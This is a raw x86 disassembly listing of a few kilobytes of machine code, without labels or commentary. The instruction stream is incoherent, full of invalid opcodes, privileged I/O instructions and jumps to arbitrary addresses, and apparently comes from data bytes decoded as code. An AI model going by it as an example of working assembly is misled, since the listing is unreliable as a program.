  40c22d:	int3   
  40c22e:	aaa    
  40c22f:	jo     0x40c21a
  40c231:	ret    0x6df4
  40c234:	inc    ecx
  40c235:	cmp    esi,ebx
  40c237:	jge    0x40c218
  40c239:	idiv   DWORD PTR [ebp-0x49]
  40c23c:	jl     0x40c25c
  40c23e:	add    ah,bl
  40c240:	les    esi,FWORD PTR [eax+eiz*2-0x2d]
  40c244:	repnz or al,0x41
  40c247:	ins    DWORD PTR es:[edi],dx
  40c248:	xor    esp,ecx
  40c24a:	mov    edi,0x2c8f3b64
  40c24f:	loope  0x40c20a
  40c251:	nop
  40c252:	call   0xce4066bd
  40c257:	dec    eax
  40c258:	cld    
  40c259:	popf   
  40c25a:	ins    BYTE PTR es:[edi],dx
  40c25b:	add    DWORD PTR [esi-0x2e54ec11],edi
  40c261:	push   0x92913f89
  40c266:	mov    dl,0xef
  40c268:	adc    eax,DWORD PTR [esi+edi*1]
  40c26b:	xchg   edi,eax
  40c26c:	cs scas eax,DWORD PTR es:[edi]
  40c26e:	adc    esi,edi
  40c270:	add    eax,0x31ca3554
  40c275:	out    dx,eax
  40c276:	sub    al,0x35
  40c278:	add    edx,DWORD PTR [eax+0x1e6b4129]
  40c27e:	loop   0x40c2c8
  40c280:	jg     0x40c287
  40c282:	adc    dh,BYTE PTR [ebx]
  40c284:	or     al,0x81
  40c286:	hlt    
  40c287:	js     0x40c2b5
  40c289:	push   ecx
  40c28a:	cdq    
  40c28b:	arpl   WORD PTR [ebx+0x10],sp
  40c28e:	add    BYTE PTR [ebx+edi*2+0x6],0xa4
  40c293:	push   esp
  40c294:	add    edi,DWORD PTR [ecx]
  40c296:	or     BYTE PTR [esp+edi*4],bh
  40c299:	test   al,0x49
  40c29b:	mov    ebx,0xf0ff887f
  40c2a0:	dec    ebx
  40c2a1:	out    0xd9,eax
  40c2a3:	fdiv   st(2),st
  40c2a5:	adc    eax,0xfeffc1fe
  40c2aa:	adc    DWORD PTR [esi+0x66],esp
  40c2ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c2ae:	ins    DWORD PTR es:[edi],dx
  40c2af:	adc    BYTE PTR [ebp-0x42],0x9f
  40c2b3:	mov    esp,DWORD PTR [eax]
  40c2b5:	jns    0x40c335
  40c2b7:	jnp    0x40c268
  40c2b9:	xlat   BYTE PTR ds:[ebx]
  40c2ba:	mov    ds:0x37f0a952,eax
  40c2bf:	(bad)  
  40c2c0:	cli    
  40c2c1:	fstp   TBYTE PTR [ecx-0x3f80546]
  40c2c7:	cli    
  40c2c8:	out    dx,eax
  40c2c9:	ins    DWORD PTR es:[edi],dx
  40c2ca:	adc    ecx,ecx
  40c2cc:	jno    0x40c25c
  40c2ce:	fcom   QWORD PTR [ecx+0x3eeff1f0]
  40c2d4:	test   bh,ch
  40c2d6:	sti    
  40c2d7:	je     0x40c294
  40c2d9:	(bad)  
  40c2db:	ja     0x40c354
  40c2dd:	adc    DWORD PTR [eax+0x54798ef9],eax
  40c2e3:	pusha  
  40c2e4:	cwde   
  40c2e5:	shl    ah,cl
  40c2e7:	hlt    
  40c2e8:	xor    al,0x2f
  40c2ea:	sbb    al,0x3b
  40c2ec:	lds    esp,FWORD PTR [edi+0x618c733f]
  40c2f2:	mov    esp,0x1a7944c0
  40c2f7:	iret   
  40c2f8:	outs   dx,DWORD PTR ds:[esi]
  40c2f9:	and    dl,BYTE PTR [ebx]
  40c2fb:	pop    edi
  40c2fc:	dec    ebx
  40c2fd:	(bad)  
  40c2fe:	cld    
  40c2ff:	cwde   
  40c300:	mov    dl,0x77
  40c302:	shl    DWORD PTR [eax-0x5e6d9eff],0xa
  40c309:	push   eax
  40c30a:	adc    DWORD PTR [edx+0x6],edi
  40c30d:	rol    BYTE PTR [ebx-0x6ae7dd15],cl
  40c313:	or     eax,0x4f5718e6
  40c318:	adc    BYTE PTR [ecx],ch
  40c31a:	jae    0x40c2e4
  40c31c:	xor    DWORD PTR [edx+0x6e409b51],eax
  40c322:	fisttp DWORD PTR [esi]
  40c324:	mov    dl,0x47
  40c326:	pop    edx
  40c327:	jmp    0x40c2e8
  40c329:	jb     0x40c386
  40c32b:	xchg   BYTE PTR [ecx],ah
  40c32d:	and    al,0x71
  40c32f:	(bad)
  40c333:	xchg   BYTE PTR [ebp-0x1ee4ee78],bh
  40c339:	pop    ecx
  40c33a:	fs xor edx,ecx
  40c33d:	in     eax,dx
  40c33e:	je     0x40c331
  40c340:	fnstsw WORD PTR [esi+0x11a6edf1]
  40c346:	sbb    dh,0xa
  40c349:	jp     0x40c2fb
  40c34b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c34c:	sti    
  40c34d:	mov    bl,0x89
  40c34f:	and    ch,bl
  40c351:	add    BYTE PTR [edi-0x42811ec4],al
  40c357:	xchg   esi,eax
  40c358:	std    
  40c359:	fwait
  40c35a:	xchg   ecx,eax
  40c35b:	clc    
  40c35c:	inc    ebp
  40c35d:	push   0x40
  40c35f:	cmp    BYTE PTR [edx+ebp*2],bl
  40c362:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c363:	das    
  40c364:	mov    ch,0x64
  40c366:	push   edi
  40c367:	stc    
  40c368:	jmp    0xf9b15c7f
  40c36d:	bnd ss ret 0x5b2b
  40c372:	xchg   edi,eax
  40c373:	push   ecx
  40c374:	jp     0x40c313
  40c376:	sub    al,0x8c
  40c378:	xchg   DWORD PTR [edx+esi*1],esi
  40c37b:	or     al,0x2b
  40c37d:	and    DWORD PTR [edx+0xa4180aa],esi
  40c383:	jns    0x40c3a9
  40c385:	pusha  
  40c386:	cbw    
  40c388:	dec    ecx
  40c389:	dec    ecx
  40c38a:	call   0x15ed:0x1208505a
  40c391:	lock cmp eax,0x91042f81
  40c397:	push   edi
  40c398:	data16 adc bh,ch
  40c39b:	out    0xd7,eax
  40c39d:	jg     0x40c39a
  40c39f:	and    ch,BYTE PTR [ebp-0x700ed00a]
  40c3a5:	inc    cl
  40c3a7:	div    DWORD PTR [eax+0x7e816fb4]
  40c3ad:	mov    edi,0x6370536f
  40c3b2:	out    dx,eax
  40c3b3:	pop    ebx
  40c3b4:	dec    esp
  40c3b5:	hlt    
  40c3b6:	jns    0x40c3a0
  40c3b8:	outs   dx,BYTE PTR ds:[esi]
  40c3b9:	cwde   
  40c3ba:	ror    BYTE PTR [edi],0xfd
  40c3bd:	int    0x6f
  40c3bf:	gs ins DWORD PTR es:[edi],dx
  40c3c1:	jecxz  0x40c3b6
  40c3c3:	cmp    al,0xfa
  40c3c5:	je     0x40c389
  40c3c7:	mov    ebx,0x3cf3ade
  40c3cc:	imul   edi
  40c3ce:	aad    0xc9
  40c3d0:	pop    esi
  40c3d1:	mov    bl,0xd2
  40c3d3:	fisttp QWORD PTR [ebp+0xd49dc3e]
  40c3d9:	sbb    BYTE PTR [esi],cl
  40c3db:	xchg   esp,ecx
  40c3dd:	into   
  40c3de:	into   
  40c3df:	shr    BYTE PTR [edx+0x75],cl
  40c3e2:	stc    
  40c3e3:	test   DWORD PTR [edi-0x3],ebx
  40c3e6:	xor    ah,BYTE PTR [edi+0x2e]
  40c3e9:	xchg   esp,eax
  40c3ea:	cdq    
  40c3eb:	pop    ebp
  40c3ec:	cwde   
  40c3ed:	lds    ebp,FWORD PTR [edi]
  40c3ef:	lea    eax,[ecx-0x1c65758]
  40c3f5:	mov    cl,0x9
  40c3f7:	sbb    eax,0x242644d7
  40c3fc:	xor    dl,BYTE PTR [ecx+0x63356e78]
  40c402:	(bad)  [ecx-0x12243daa]
  40c408:	(bad)  
  40c409:	jmp    0x6762:0x564caa9f
  40c410:	adc    bl,BYTE PTR [ecx+ecx*2]
  40c413:	in     al,dx
  40c414:	ins    BYTE PTR es:[edi],dx
  40c415:	inc    eax
  40c416:	push   edi
  40c417:	rcr    BYTE PTR [ebx-0x1f],0x94
  40c41b:	and    eax,0xe22651fa
  40c420:	sbb    dl,BYTE PTR ds:0x6100ee65
  40c426:	mov    edi,0x890065af
  40c42b:	and    al,0x4e
  40c42d:	cmp    al,0x3c
  40c42f:	jp     0x40c485
  40c431:	dec    ebx
  40c432:	cmp    eax,0xea2c006b
  40c437:	stos   DWORD PTR es:[edi],eax
  40c438:	jmp    0x40c45a
  40c43a:	fistp  DWORD PTR [ebx+0x5a]
  40c43d:	or     eax,eax
  40c43f:	ins    DWORD PTR es:[edi],dx
  40c440:	mov    ebx,0x43e90042
  40c445:	daa    
  40c446:	cmp    dl,BYTE PTR [ecx+esi*1+0x2d39e65b]
  40c44d:	cld    
  40c44e:	xchg   ecx,eax
  40c44f:	jb     0x40c40a
  40c451:	jb     0x40c40c
  40c453:	adc    BYTE PTR [eax],0x8c
  40c456:	les    ecx,FWORD PTR [ebp-0x88f2911]
  40c45c:	cmc    
  40c45d:	sub    al,0x5f
  40c45f:	out    dx,eax
  40c460:	cmp    BYTE PTR [ebx-0x4160a7fe],ah
  40c466:	xchg   esp,eax
  40c467:	push   esp
  40c468:	sub    dl,BYTE PTR ds:0xf9623892
  40c46e:	in     al,dx
  40c46f:	push   ss
  40c470:	xchg   edx,eax
  40c471:	data16 stos BYTE PTR es:[edi],al
  40c473:	inc    ebx
  40c474:	mov    dh,ah
  40c476:	jp     0x40c401
  40c478:	xchg   ebx,eax
  40c479:	add    al,0xd5
  40c47b:	or     al,0x6
  40c47d:	fwait
  40c47e:	sbb    al,0xcc
  40c480:	adc    BYTE PTR gs:[esi],cl
  40c483:	add    cl,BYTE PTR [eax+0x5]
  40c486:	mov    edi,0x55129ebb
  40c48b:	add    BYTE PTR [edx+0x52],0x9
  40c48f:	sbb    ah,dh
  40c491:	push   0xffffffc3
  40c493:	xchg   edi,eax
  40c494:	out    dx,eax
  40c495:	sbb    DWORD PTR [edi],0x7b
  40c498:	and    al,0x9
  40c49a:	test   cl,cl
  40c49c:	adc    bh,BYTE PTR [edi-0x49ea2609]
  40c4a2:	mov    dh,0xff
  40c4a4:	adc    edi,DWORD PTR [edi]
  40c4a6:	cli    
  40c4a7:	leave  
  40c4a8:	out    dx,eax
  40c4a9:	loope  0x40c459
  40c4ab:	mov    ebx,0xb76ed00e
  40c4b0:	inc    edi
  40c4b1:	cwde   
  40c4b2:	inc    eax
  40c4b3:	cli    
  40c4b4:	pop    esp
  40c4b5:	imul   esp,esp,0x3ca1e63
  40c4bb:	je     0x40c478
  40c4bd:	pop    ebp
  40c4be:	jmp    0xde37:0xf43f0af5
  40c4c5:	enter  0x47b3,0x2f
  40c4c9:	jno    0x40c4af
  40c4cb:	scas   al,BYTE PTR es:[edi]
  40c4cc:	cmp    eax,0xc2c3870c
  40c4d1:	jns    0x40c4d1
  40c4d3:	inc    ebp
  40c4d4:	int3   
  40c4d5:	les    edi,FWORD PTR [ebp-0x5fcf9f02]
  40c4db:	pop    esi
  40c4dc:	scas   eax,DWORD PTR es:[edi]
  40c4dd:	shr    DWORD PTR [esi+esi*1-0x7],cl
  40c4e1:	aad    0x5f
  40c4e3:	inc    DWORD PTR [edx]
  40c4e5:	jg     0x40c4d9
  40c4e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c4e8:	imul   edx,DWORD PTR [eax-0x46],0x13
  40c4ec:	iret   
  40c4ed:	fwait
  40c4ee:	add    BYTE PTR [edi+0x48668ba1],bh
  40c4f4:	test   dh,dh
  40c4f6:	out    dx,eax
  40c4f7:	in     eax,0x89
  40c4f9:	xor    edx,DWORD PTR [ecx]
  40c4fb:	xchg   cl,ah
  40c4fd:	cmp    BYTE PTR [ecx+ebp*2-0x7def8c02],al
  40c504:	popf   
  40c505:	cmc    
  40c506:	xchg   edi,eax
  40c507:	xor    DWORD PTR [edx],edi
  40c509:	dec    ebx
  40c50a:	xor    eax,0xf4eac1d5
  40c50f:	cli    
  40c510:	(bad)  
  40c511:	dec    edx
  40c512:	jge    0x40c52b
  40c514:	or     esp,esp
  40c516:	or     eax,DWORD PTR [ecx-0x2c7dd9e8]
  40c51c:	push   edx
  40c51d:	push   es
  40c51e:	xor    DWORD PTR [edx],esi
  40c520:	pop    esp
  40c521:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c522:	popa   
  40c523:	bnd ret 0x609
  40c527:	xchg   edx,eax
  40c528:	test   BYTE PTR [ecx-0x6771a55c],dl
  40c52e:	lahf   
  40c52f:	lods   eax,DWORD PTR ds:[esi]
  40c530:	(bad)  
  40c531:	aam    0xc3
  40c533:	push   esp
  40c534:	xlat   BYTE PTR ds:[ebx]
  40c535:	dec    ecx
  40c536:	push   ebp
  40c537:	add    BYTE PTR [ebx],dh
  40c539:	xadd   BYTE PTR ds:0x9c714292,dl
  40c540:	outs   dx,BYTE PTR gs:[esi]
  40c542:	push   ebx
  40c543:	(bad)  [ebp+0x1c]
  40c546:	inc    eax
  40c547:	out    0xe4,al
  40c549:	and    BYTE PTR [ebx],bl
  40c54b:	jmp    0xaa482bf7
  40c550:	psraw  mm4,QWORD PTR [edx]
  40c553:	push   es
  40c554:	and    esp,edi
  40c556:	ret    0xe050
  40c559:	jmp    0x40c57c
  40c55b:	sbb    BYTE PTR [ebx-0x165089a3],0x3e
  40c562:	jnp    0x40c535
  40c564:	ds xor al,0x3
  40c567:	test   al,0x54
  40c569:	sub    bl,BYTE PTR [ecx]
  40c56b:	cs pop ebp
  40c56d:	scas   eax,DWORD PTR es:[edi]
  40c56e:	xlat   BYTE PTR ds:[ebx]
  40c56f:	jmp    0x72fd4169
  40c574:	push   0x1b
  40c576:	les    esi,FWORD PTR [esi+ebx*4]
  40c579:	xchg   BYTE PTR [ebp-0x39abc2a6],bl
  40c57f:	sbb    eax,0xd9fc6661
  40c584:	dec    ebx
  40c585:	test   eax,0xe7f10e9d
  40c58a:	popa   
  40c58b:	mov    edi,0xddcc088b
  40c590:	adc    al,BYTE PTR [edi+0x426fd490]
  40c596:	and    al,BYTE PTR ds:0x2a7c19d2
  40c59c:	or     DWORD PTR [ecx-0x33bec817],ebp
  40c5a2:	add    bl,BYTE PTR [edi-0x4]
  40c5a5:	jmp    0x1aff:0xfdefe55
  40c5ac:	jmp    edx
  40c5ae:	lahf   
  40c5af:	jge    0x40c5e8
  40c5b1:	neg    DWORD PTR [ecx+edi*1]
  40c5b4:	inc    esp
  40c5b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c5b6:	shl    DWORD PTR [ecx-0x54a324ee],cl
  40c5bc:	sub    BYTE PTR [edi+edx*8-0x14],ah
  40c5c0:	ja     0x40c551
  40c5c2:	lea    esp,[edx-0x6c423a78]
  40c5c8:	sub    al,0xee
  40c5ca:	popf   
  40c5cb:	xor    BYTE PTR fs:[eax],bl
  40c5ce:	fs jb  0x40c609
  40c5d1:	out    0x99,al
  40c5d3:	inc    esi
  40c5d4:	shl    DWORD PTR [esi-0x40],1
  40c5d7:	xor    cl,BYTE PTR [ecx+ebx*8+0x799e59d9]
  40c5de:	out    dx,al
  40c5df:	add    al,0xbf
  40c5e1:	repnz pop edi
  40c5e3:	sahf   
  40c5e4:	arpl   WORD PTR [ebx-0xb1b36cd],si
  40c5ea:	cmp    BYTE PTR [ecx],cl
  40c5ec:	xor    eax,0x461050e2
  40c5f1:	or     DWORD PTR [ecx+0x20],eax
  40c5f4:	nop
  40c5f5:	mov    cl,0xa3
  40c5f7:	dec    esi
  40c5f8:	mov    ecx,0xb10c2dd4
  40c5fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c5fe:	push   0xffffff80
  40c600:	fisubr DWORD PTR [esp+ebx*1]
  40c603:	ret    0x7616
  40c606:	jg     0x40c612
  40c608:	ror    DWORD PTR ds:0xb6a572a3,cl
  40c60e:	mov    ecx,0xf6031ea0
  40c613:	jb     0x40c5ab
  40c615:	sub    ebp,DWORD PTR [ebx-0x77c4df40]
  40c61b:	add    eax,0xb6c8ba29
  40c620:	hlt    
  40c621:	cdq    
  40c622:	shr    bl,cl
  40c624:	stos   BYTE PTR es:[edi],al
  40c625:	jp     0x40c5b7
  40c627:	xor    dl,ch
  40c629:	inc    DWORD PTR [ebx+0x49]
  40c62c:	sbb    BYTE PTR [esi],ah
  40c62e:	mov    WORD PTR [edi+0x12],ss
  40c631:	test   dh,0x4f
  40c634:	adc    DWORD PTR [esi-0x1f],eax
  40c637:	mov    BYTE PTR [edx],cl
  40c639:	pusha  
  40c63a:	pop    edx
  40c63b:	mov    ecx,0x7373665c
  40c640:	xor    eax,ebx
  40c642:	add    ah,dh
  40c644:	cmp    BYTE PTR ds:0x1321b70,bl
  40c64a:	cdq    
  40c64b:	mov    dh,0x1b
  40c64d:	add    al,0xe0
  40c64f:	dec    ecx
  40c650:	test   eax,0x41063792
  40c655:	mov    al,ds:0x33f9bf25
  40c65a:	int    0xe5
  40c65c:	(bad)  
  40c65d:	jmp    0x5a5dfba9
  40c662:	adc    al,0x25
  40c664:	out    0xb6,al
  40c666:	pop    ebx
  40c667:	add    eax,0xcfb5aff5
  40c66c:	popf   
  40c66d:	shr    BYTE PTR [edx],cl
  40c66f:	sbb    al,0xa2
  40c671:	sub    al,0x57
  40c673:	sub    ebp,DWORD PTR [esi+ebp*4+0x2dbdb1ae]
  40c67a:	pushf  
  40c67b:	add    DWORD PTR [edi+0x3892673e],edx
  40c681:	nop
  40c682:	shl    BYTE PTR ds:0xe91e9904,1
  40c688:	es or  cl,cl
  40c68b:	inc    edx
  40c68c:	jg     0x40c6b5
  40c68e:	and    BYTE PTR [eax+0x64],cl
  40c691:	aad    0x2
  40c693:	jne    0x40c633
  40c695:	mov    DWORD PTR [ecx],ecx
  40c697:	sar    BYTE PTR [ecx+0x3],1
  40c69a:	sar    BYTE PTR [ecx+0x8],1
  40c69d:	test   DWORD PTR [edx],esi
  40c69f:	mov    ch,BYTE PTR [ecx-0x6776fabd]
  40c6a5:	jecxz  0x40c658
  40c6a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c6a8:	xlat   BYTE PTR ds:[ebx]
  40c6a9:	clc    
  40c6aa:	loope  0x40c72b
  40c6ac:	clc    
  40c6ad:	sub    DWORD PTR [esi-0x16],edi
  40c6b0:	pop    edi
  40c6b1:	jge    0x40c637
  40c6b3:	cmp    ecx,DWORD PTR [esi]
  40c6b5:	in     eax,dx
  40c6b6:	arpl   WORD PTR [ebx+0x7b],di
  40c6b9:	cmp    esp,DWORD PTR [ebx+0x5d]
  40c6bc:	into   
  40c6bd:	xor    eax,DWORD PTR [eax]
  40c6bf:	ja     0x40c6a7
  40c6c1:	pop    ecx
  40c6c2:	push   ds
  40c6c3:	rcr    BYTE PTR [ebx+0x113b23e4],cl
  40c6c9:	jp     0x40c69c
  40c6cb:	fadd   QWORD PTR [edi+esi*4]
  40c6ce:	jg     0x40c6d7
  40c6d0:	add    DWORD PTR [ecx],0x73
  40c6d3:	jae    0x40c748
  40c6d5:	mov    ah,0x3b
  40c6d7:	cmp    eax,0xfe5fdffe
  40c6dc:	xor    ah,BYTE PTR [edi-0x1a07fa32]
  40c6e2:	sbb    eax,esi
  40c6e4:	(bad)  
  40c6e5:	xchg   ecx,eax
  40c6e6:	push   esp
  40c6e7:	mov    BYTE PTR [edx+0x55],ah
  40c6ea:	inc    esi
  40c6eb:	cmp    al,0x8e
  40c6ed:	xchg   ebp,eax
  40c6ee:	mov    al,ds:0x6ec42390
  40c6f3:	(bad)  
  40c6f4:	mov    ebp,DWORD PTR [ebx-0x80]
  40c6f7:	jae    0x40c71a
  40c6f9:	mov    esi,0x5e5c5833
  40c6fe:	xor    BYTE PTR [edx-0x42],dh
  40c701:	jnp    0x40c693
  40c703:	mov    ah,0x8b
  40c705:	pop    ecx
  40c706:	push   ebp
  40c707:	inc    edx
  40c708:	jg     0x40c725
  40c70a:	out    0xfb,eax
  40c70c:	pop    ecx
  40c70d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c70e:	sub    BYTE PTR [ebx],0xf0
  40c711:	shl    BYTE PTR [ecx],cl
  40c713:	loope  0x40c74e
  40c715:	enter  0x7cc4,0x53
  40c719:	push   ebp
  40c71a:	or     eax,eax
  40c71c:	dec    esp
  40c71d:	cmp    dl,BYTE PTR [edx-0x3a]
  40c720:	rcl    BYTE PTR [edx+0x200fc7d7],0xec
  40c727:	lea    edx,[esi+0x3]
  40c72a:	xor    bh,ch
  40c72c:	jmp    0xd18fc62c
  40c731:	popf   
  40c732:	sbb    eax,0xc768a560
  40c737:	lods   eax,DWORD PTR ds:[esi]
  40c738:	push   0x4d0061bb
  40c73d:	ret    
  40c73e:	add    BYTE PTR [edi+edi*4+0x64],bh
  40c742:	cmp    DWORD PTR [edi+0x84250f9],esi
  40c748:	sbb    eax,0xfff5980d
  40c74d:	pop    ss
  40c74e:	jmp    0x8e37c0e2
  40c753:	test   dl,bh
  40c755:	cmp    ebx,DWORD PTR [ebp+0x77]
  40c758:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c759:	repz bound ebx,QWORD PTR [ebp-0x1d]
  40c75d:	sar    ah,0x49
  40c760:	test   eax,0x6ab54f0c
  40c765:	xchg   ebp,eax
  40c766:	adc    esp,DWORD PTR [edi]
  40c768:	ss push 0x82564bb5
  40c76e:	fadd   DWORD PTR [ecx]
  40c770:	fs call 0xf3118ab4
  40c776:	dec    eax
  40c777:	and    BYTE PTR [ebx-0x8],cl
  40c77a:	xchg   esi,eax
  40c77b:	loopne 0x40c79e
  40c77d:	mov    ebx,0xb7cee49c
  40c782:	int3   
  40c783:	inc    eax
  40c784:	and    al,BYTE PTR [ebp-0x76ef5719]
  40c78a:	cs push cs
  40c78c:	in     al,0x4a
  40c78e:	adc    al,0xf
  40c790:	sub    esi,esi
  40c792:	lock mov ch,0x67
  40c795:	loope  0x40c7de
  40c797:	ds stc 
  40c799:	sub    DWORD PTR [esi-0x6],edi
  40c79c:	(bad)  
  40c79d:	aas    
  40c79e:	into   
  40c79f:	fsub   st(4),st
  40c7a1:	xor    al,0x1b
  40c7a3:	sbb    ebx,DWORD PTR [ebx]
  40c7a5:	push   0xffffffaf
  40c7a7:	out    0x8d,eax
  40c7a9:	pop    eax
  40c7aa:	lock repz push edx
  40c7ad:	mov    ebx,0xd7702548
  40c7b2:	mov    esp,DWORD PTR [eax-0x3ff0c442]
  40c7b8:	xor    BYTE PTR [ecx],cl
  40c7ba:	arpl   bp,si
  40c7bc:	lahf   
  40c7bd:	cwde   
  40c7be:	cwde   
  40c7bf:	loopne 0x40c7d8
  40c7c1:	jg     0x40c7a8
  40c7c3:	or     edi,DWORD PTR [esi+edi*8-0x35]
  40c7c7:	push   edi
  40c7c8:	or     DWORD PTR [ebx+0x24d13c25],edx
  40c7ce:	mov    eax,ds:0x262389aa
  40c7d3:	mov    es,WORD PTR [ebp+0x5217b58a]
  40c7d9:	sti    
  40c7da:	sti    
  40c7db:	sbb    eax,0x6cf5aec9
  40c7e0:	xchg   ecx,eax
  40c7e1:	leave  
  40c7e2:	mov    edx,0xedcfc963
  40c7e7:	jp     0x40c7d0
  40c7e9:	js     0x40c832
  40c7eb:	mov    edx,0xc920461b
  40c7f0:	xor    DWORD PTR [eax],edx
  40c7f2:	out    0x72,eax
  40c7f4:	xchg   esi,eax
  40c7f5:	xchg   BYTE PTR ds:0xd31748b3,dh
  40c7fb:	imul   eax,DWORD PTR [edx],0x45
  40c7fe:	inc    esi
  40c7ff:	rol    DWORD PTR [esp+edi*8+0x2e761278],0x48
  40c807:	ins    BYTE PTR es:[edi],dx
  40c808:	rol    BYTE PTR [ecx-0x721cf63b],cl
  40c80e:	sbb    BYTE PTR [edi+0x24bdbc98],cl
  40c814:	outs   dx,DWORD PTR ds:[esi]
  40c815:	mov    ds:0xe829ebe9,eax
  40c81a:	jmp    0x4db8:0x17baf67e
  40c821:	cs inc eax
  40c823:	mov    eax,0xa4202309
  40c828:	leave  
  40c829:	cmp    eax,0x668091b3
  40c82e:	neg    BYTE PTR [edi-0x251b2665]
  40c834:	pop    ecx
  40c835:	sub    DWORD PTR [edi-0x7b],0x692d7fbe
  40c83c:	lahf   
  40c83d:	pop    edi
  40c83e:	idiv   DWORD PTR [edi+ecx*4]
  40c841:	sahf   
  40c842:	push   cs
  40c843:	scas   eax,DWORD PTR es:[edi]
  40c844:	xchg   ebp,eax
  40c845:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c846:	push   eax
  40c847:	(bad)  
  40c849:	mov    DWORD PTR [edx],ebp
  40c84b:	iret   
  40c84c:	sahf   
  40c84d:	pop    ebp
  40c84e:	mov    eax,ds:0x40652ad3
  40c853:	mov    es,eax
  40c855:	or     edi,edi
  40c857:	int    0x41
  40c859:	(bad)  
  40c85a:	in     al,dx
  40c85b:	mov    dh,0x3c
  40c85d:	shr    DWORD PTR [ebx-0x1b156aff],1
  40c863:	ret    0x2739
  40c866:	inc    ebp
  40c867:	push   cs
  40c868:	jbe    0x40c843
  40c86a:	xor    BYTE PTR [ecx+eiz*2],ah
  40c86d:	push   eax
  40c86e:	add    BYTE PTR [eax],cl
  40c870:	mov    eax,ds:0xb48c8098
  40c875:	retf   
  40c876:	push   eax
  40c877:	pop    edi
  40c878:	xor    esp,DWORD PTR [ecx-0x7a]
  40c87b:	das    
  40c87c:	aas    
  40c87d:	jbe    0x40c814
  40c87f:	pop    ds
  40c880:	stc    
  40c881:	in     al,0x7f
  40c883:	loope  0x40c84c
  40c885:	jg     0x40c873
  40c887:	arpl   WORD PTR [ebx+ebx*4],si
  40c88a:	dec    ebp
  40c88b:	mov    dh,0xb6
  40c88d:	mov    dh,0x9c
  40c88f:	jnp    0x40c87e
  40c891:	lods   al,BYTE PTR ds:[esi]
  40c892:	mov    bh,0x17
  40c894:	mov    eax,ds:0xbcbefc83
  40c899:	and    eax,edx
  40c89b:	adc    BYTE PTR [edi-0x71dfd8c5],bh
  40c8a1:	arpl   si,si
  40c8a3:	in     al,dx
  40c8a4:	fld    st(3)
  40c8a6:	repz inc edi
  40c8a8:	iret   
  40c8a9:	lock test eax,0xd5a31f4f
  40c8af:	popf   
  40c8b0:	les    ebp,FWORD PTR [ebx]
  40c8b2:	dec    edi
  40c8b3:	and    al,BYTE PTR [ebp-0x7d]
  40c8b6:	and    al,0x11
  40c8b8:	test   BYTE PTR [ecx+0x44],dl
  40c8bb:	adc    al,0x79
  40c8bd:	inc    esp
  40c8be:	push   ecx
  40c8bf:	inc    edx
  40c8c0:	sbb    BYTE PTR [ecx+0x84f7f20],ch
  40c8c6:	lock int3 
  40c8c8:	test   DWORD PTR [eax+0x25],0x197efdbd
  40c8cf:	pop    ebx
  40c8d0:	and    BYTE PTR [edx+0x36],0xe
  40c8d4:	(bad)  
  40c8d6:	out    dx,eax
  40c8d7:	out    0xd9,al
  40c8d9:	arpl   WORD PTR [ecx],sp
  40c8db:	popf   
  40c8dc:	aad    0x58
  40c8de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c8df:	dec    edx
  40c8e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c8e1:	ret    0x65ca
  40c8e4:	push   cs
  40c8e5:	inc    ebp
  40c8e6:	enter  0x6d40,0x1f
  40c8ea:	cmc    
  40c8eb:	push   esp
  40c8ec:	fs xchg ecx,eax
  40c8ee:	mov    al,ds:0xeaa404ca
  40c8f3:	add    DWORD PTR [edx+0x41834489],ebp
  40c8f9:	int3   
  40c8fa:	mov    eax,ds:0x2a546303
  40c8ff:	and    eax,0xb9fbb6b6
  40c904:	jecxz  0x40c959
  40c906:	aad    0x38
  40c908:	dec    ecx
  40c909:	adc    dh,BYTE PTR [esi]
  40c90b:	aaa    
  40c90c:	aaa    
  40c90d:	mov    ecx,DWORD PTR [edx-0x760d437f]
  40c913:	dec    edi
  40c914:	jl     0x40c8f8
  40c916:	fidiv  DWORD PTR [ecx]
  40c918:	(bad)  
  40c91a:	shl    BYTE PTR [esi+0x4ba0376b],0xcc
  40c921:	cs push ebx
  40c923:	jo     0x40c91c
  40c925:	in     eax,0x97
  40c927:	and    DWORD PTR [ebx],ecx
  40c929:	or     esp,0xfffffffa
  40c92c:	aaa    
  40c92d:	fimul  DWORD PTR [esi]
  40c92f:	pusha  
  40c930:	scas   al,BYTE PTR es:[edi]
  40c931:	jae    0x40c956
  40c933:	sti    
  40c934:	inc    eax
  40c935:	jge    0x40c8d1
  40c937:	dec    eax
  40c938:	iret   
  40c939:	popf   
  40c93a:	aaa    
  40c93b:	push   eax
  40c93c:	push   eax
  40c93d:	or     DWORD PTR es:[esi-0x5b],edi
  40c941:	add    BYTE PTR [edx+esi*2-0x12],0xfc
  40c946:	cmp    dh,BYTE PTR [edx]
  40c948:	sub    al,BYTE PTR [ebx-0x27]
  40c94b:	cmp    eax,0xe839d85f
  40c950:	out    dx,al
  40c951:	mov    ebx,0x61c7c258
  40c956:	or     BYTE PTR [ecx-0x29],bh
  40c959:	pop    ds
  40c95a:	test   eax,0xb810c0cd
  40c95f:	cmp    DWORD PTR [edi],edi
  40c961:	add    ecx,DWORD PTR [esi+0x2c280432]
  40c967:	mov    cl,0x4b
  40c969:	push   esp
  40c96a:	cwde   
  40c96b:	jle    0x40c989
  40c96d:	inc    ebx
  40c96e:	pop    edx
  40c96f:	ror    DWORD PTR [edi+0x0],cl
  40c972:	push   ds
  40c973:	xor    DWORD PTR [ebx+0x2b8bee7c],esi
  40c979:	cld    
  40c97a:	jecxz  0x40c99b
  40c97c:	std    
  40c97d:	adc    al,0xff
  40c97f:	cld    
  40c980:	lahf   
  40c981:	jle    0x40c917
  40c983:	inc    esi
  40c984:	mov    ds:0xba30f361,eax
  40c989:	out    dx,eax
  40c98a:	pop    esp
  40c98b:	and    al,0xe5
  40c98d:	repz (bad) 
